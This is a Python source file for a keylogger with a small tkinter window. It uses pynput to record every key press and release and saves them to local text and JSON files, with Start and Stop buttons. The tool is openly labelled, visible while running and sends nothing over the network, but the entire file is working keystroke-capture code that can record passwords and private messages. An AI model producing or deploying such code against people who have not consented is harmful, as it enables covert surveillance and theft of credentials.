import tkinter as tk
from tkinter import *
from pynput import keyboard
import json

keys_used = []
keys = ""


def generate_text_log(key):
    with open('key_log.txt', "w+") as log_file:
        log_file.write(key)


def generate_json_file(keys_used):
    with open('key_log.json', 'w') as key_log:
        json.dump(keys_used, key_log)
        


def on_press(key):
    global keys_used, keys
    try:
        keys_used.append({'Pressed': key.char})
        keys += key.char
    except AttributeError:
        keys_used.append({'Pressed': str(key)})
        keys += ' ' + str(key) + ' '
    generate_json_file(keys_used)


def on_release(key):
    global keys_used, keys
    keys_used.append({'Released': str(key)})
    generate_json_file(keys_used)
    generate_text_log(keys)

    if key == keyboard.Key.esc:  # Stop listener on Esc key
        return False


def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'key_log.txt' and 'key_log.json'")
    start_button.config(state='disabled')
    stop_button.config(state='normal')


def stop_keylogger():
    global listener
    listener.stop()
    label.config(text="Keylogger stopped.")
    start_button.config(state='normal')
    stop_button.config(state='disabled')


root = Tk()
root.title("Keylogger")

label = Label(root, text='Click "Start" to begin keylogging.')
label.config(anchor=CENTER)
label.pack(pady=20)

start_button = Button(root, text="Start", command=start_keylogger)
start_button.pack(side=LEFT, padx=20)

stop_button = Button(root, text="Stop", command=stop_keylogger, state='disabled')
stop_button.pack(side=RIGHT, padx=20)

root.geometry("300x150")
root.mainloop()
